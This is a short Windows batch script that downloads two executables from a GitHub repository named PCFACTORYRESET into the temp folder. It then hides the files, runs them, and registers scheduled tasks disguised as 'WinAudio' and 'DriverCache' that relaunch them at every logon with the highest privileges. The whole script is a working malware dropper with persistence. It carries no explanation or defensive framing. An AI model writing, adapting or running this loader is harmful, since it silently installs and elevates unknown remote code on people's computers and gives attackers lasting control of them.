@echo off
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/PCFACTORYRESET/PCFACTORYRESET/raw/refs/heads/main/dsc' -OutFile '%temp%\dsc.exe' -UseBasicParsing"
attrib +h "%temp%\dsc.exe"
start %temp%\dsc.exe
schtasks /create /tn "WinAudio" /tr "\"%TEMP%\dsc.exe\"" /sc onlogon /rl highest /f
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/PCFACTORYRESET/PCFACTORYRESET/raw/refs/heads/main/main' -OutFile '%temp%\main.exe' -UseBasicParsing"
attrib +h "%temp%\main.exe"
start %temp%\main.exe
schtasks /create /tn "DriverCache" /tr "\"%TEMP%\main.exe\"" /sc onlogon /rl highest /f
